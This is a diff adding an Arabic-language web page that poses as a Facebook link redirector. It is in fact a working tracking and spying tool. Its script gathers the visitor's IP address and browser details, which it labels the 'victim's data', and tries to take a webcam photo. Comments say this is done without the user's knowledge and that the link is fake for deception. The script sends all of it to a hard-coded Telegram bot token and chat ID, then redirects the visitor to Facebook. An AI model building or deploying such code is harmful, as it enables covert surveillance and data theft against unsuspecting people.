@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رابط التوجيه</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            width: 400px;
+            text-align: center;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            background: #0088cc;
+            color: #fff;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #006699;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            background: #eef;
+            border-radius: 6px;
+            word-break: break-all;
+        }
+        a {
+            color: #0088cc;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>📎 أدخل رابط صفحة فيسبوك</h2>
+        <input type="text" id="fbLink" placeholder="مثال: https://www.facebook.com/username" />
+        <br>
+        <button onclick="generateLink()">إرسال</button>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        // ===== إعدادات بوت التيلجرام =====
+        const BOT_TOKEN = '8940194661:AAFXBaZq-9j9H_GuJIXHYXYOnk-hpxmLxYY'; // ضع توكن البوت هنا
+        const CHAT_ID = '8918858258'; // ضع معرف الدردشة هنا
+
+        // ===== دالة لجلب عنوان IP العمومي =====
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'غير معروف';
+            }
+        }
+
+        // ===== دالة لجلب بيانات المتصفح =====
+        function getBrowserInfo() {
+            return `
+            🖥️ **بيانات الضحية**:
+            - المتصفح: ${navigator.userAgent}
+            - اللغة: ${navigator.language}
+            - الشاشة: ${screen.width}x${screen.height}
+            - الوقت: ${new Date().toLocaleString('ar-EG')}
+            `;
+        }
+
+        // ===== دالة لالتقاط صورة من الكاميرا (بدون علم المستخدم) =====
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                // نحاول تشغيل الكاميرا
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        // نأخذ لقطة بعد 500ms
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.8); // صورة base64
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(imageData);
+                        }, 500);
+                    })
+                    .catch(() => {
+                        resolve(null); // في حال رفض الإذن أو عدم وجود كاميرا
+                    });
+            });
+        }
+
+        // ===== الدالة الأساسية =====
+        async function generateLink() {
+            const input = document.getElementById('fbLink');
+            const resultDiv = document.getElementById('result');
+            const fbUrl = input.value.trim();
+
+            if (!fbUrl) {
+                resultDiv.innerHTML = '⚠️ الرجاء إدخال رابط صفحة فيسبوك.';
+                return;
+            }
+
+            // 1. توليد رابط عشوائي (للتضليل)
+            const randomId = Math.random().toString(36).substring(2, 10);
+            const fakeLink = `https://link-${randomId}.com/redirect?url=${encodeURIComponent(fbUrl)}`;
+
+            // 2. عرض الرابط للمستخدم
+            resultDiv.innerHTML = `
+                ✅ تم التوليد! افتح الرابط التالي:<br>
+                <a href="${fakeLink}" target="_blank">${fakeLink}</a>
+                <br><small>(سيتم توجيهك إلى صفحة فيسبوك بعد جمع البيانات)</small>
+            `;
+
+            // 3. نبدأ بجمع البيانات في الخلفية (دون أن يشعر المستخدم)
+            try {
+                // جلب الـ IP
+                const ip = await getPublicIP();
+                const browserData = getBrowserInfo();
+
+                // التقاط الصورة (إذا سمحت الكاميرا)
+                const photoBase64 = await capturePhoto();
+
+                // تجهيز الرسالة المرسلة إلى التيلجرام
+                let message = `🔴 **تم فتح الرابط المزيف**\n`;
+                message += `📌 الرابط: ${fakeLink}\n`;
+                message += `🌐 IP: ${ip}\n`;
+                message += browserData;
+
+                // إرسال النص إلى التيلجرام
+                await sendToTelegram('text', message);
+
+                // إذا التقطنا صورة، نرسلها كصورة
+                if (photoBase64) {
+                    await sendToTelegram('photo', photoBase64);
+                }
+
+                console.log('✅ تم إرسال جميع البيانات إلى التيلجرام.');
+            } catch (error) {
+                console.error('❌ خطأ أثناء جمع البيانات:', error);
+            }
+
+            // 4. توجيه المستخدم إلى رابط فيسبوك الحقيقي بعد 3 ثواني (للتضليل)
+            setTimeout(() => {
+                window.location.href = fbUrl;
+            }, 3000);
+        }
+
+        // ===== دالة الإرسال إلى تيلجرام =====
+        async function sendToTelegram(type, content) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+            if (type === 'text') {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: content,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } else if (type === 'photo') {
+                // content هي base64 للصورة
+                const blob = dataURLtoBlob(content);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+
+                await fetch(photoUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+
+        // ===== دالة مساعدة لتحويل base64 إلى Blob =====
+        function dataURLtoBlob(dataURL) {
+            const parts = dataURL.split(',');
+            const mime = parts[0].match(/:(.*?);/)[1];
+            const byteString = atob(parts[1]);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uint8Array = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uint8Array[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([arrayBuffer], { type: mime });
+        }
+    </script>
+</body>
+</html>
